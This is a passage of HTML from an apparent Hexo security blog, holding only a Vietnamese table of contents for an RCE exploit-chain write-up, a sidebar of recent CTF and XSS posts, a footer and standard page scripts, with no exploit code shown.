class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">1.2.</span> <span class="toc-text">Solution</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Xac-dinh-vi-tri-xay-ra-loi-bao-mat-trong-ma-nguon"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. Xác định vị trí xảy ra lỗi bảo mật trong mã nguồn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Tim-cac-gadgets-co-san-trong-ma-nguon-de-tao-thanh-exploit-chain-RCE"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. Tìm các gadgets có sẵn trong mã nguồn để tạo thành exploit chain RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Poc-Proof-of-Concept"><span class="toc-number">1.2.3.</span> <span class="toc-text">3. Poc (Proof of Concept)</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/10/02/2025/ctf/holactf/writeup/" title="Writeup: HolaCTF 2025"><img src="/img/ctf/holactf/poster.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: HolaCTF 2025"/></a><div class="content"><a class="title" href="/2025/10/02/2025/ctf/holactf/writeup/" title="Writeup: HolaCTF 2025">Writeup: HolaCTF 2025</a><time datetime="2025-10-02T07:18:22.000Z" title="Created 2025-10-02 14:18:22">2025-10-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/27/Experiences/XSS/xss/" title="Experience: Cross Side Script (XSS)"><img src="/img/experience/xss.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Experience: Cross Side Script (XSS)"/></a><div class="content"><a class="title" href="/2025/09/27/Experiences/XSS/xss/" title="Experience: Cross Side Script (XSS)">Experience: Cross Side Script (XSS)</a><time datetime="2025-09-27T11:12:56.000Z" title="Created 2025-09-27 18:12:56">2025-09-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/25/2025/ctf/cyberconDTU/writeup/" title="Writeup: cyberconDTU 2025"><img src="/img/ctf/cybercon/poster_cybercon.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: cyberconDTU 2025"/></a><div class="content"><a class="title" href="/2025/09/25/2025/ctf/cyberconDTU/writeup/" title="Writeup: cyberconDTU 2025">Writeup: cyberconDTU 2025</a><time datetime="2025-09-25T09:12:34.000Z" title="Created 2025-09-25 16:12:34">2025-09-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/05/2025/hexo/Hexo/" title="Hexo"><img src="/img/hexo/hexo-wall.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hexo"/></a><div class="content"><a class="title" href="/2025/09/05/2025/hexo/Hexo/" title="Hexo">Hexo</a><time datetime="2025-09-05T11:03:45.000Z" title="Created 2025-09-05 18:03:45">2025-09-05</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/ctf/holactf/poster.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By H00d1eBl4ck</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="1" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
